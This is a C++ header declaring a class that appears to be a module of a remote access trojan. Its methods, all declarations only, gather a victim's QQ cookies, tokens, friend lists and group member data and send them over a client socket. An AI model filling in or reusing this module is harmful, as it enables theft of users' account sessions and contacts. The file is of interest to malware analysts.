// GetQQInfo.h: interface for the CGetQQInfo class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_GETQQINFO_H__8240B8A4_4F14_4806_9F0C_610B06373869__INCLUDED_)
#define AFX_GETQQINFO_H__8240B8A4_4F14_4806_9F0C_610B06373869__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "Manager.h"
#include "cJSON.h"

class CQQInfoManager : public CManager
{
public:
	CQQInfoManager(CClientSocket *pClient);
	virtual ~CQQInfoManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
private:
	BOOL SendQQLocalJson();
	BOOL GetQQCookieInfo(char *szNumber, char *szToken, char *szInCookie, char *szOutCookie, size_t stOutSize);
	cJSON* GetQQFriendJson(char *szInCookie);
	cJSON* GetQQGroupMemberJson(char *szInCookie, char *szPostData);
	cJSON* GetQQGroupJson(char *szInCookie);
	cJSON* GetQQLocalJson();
};

#endif // !defined(AFX_GETQQINFO_H__8240B8A4_4F14_4806_9F0C_610B06373869__INCLUDED_)
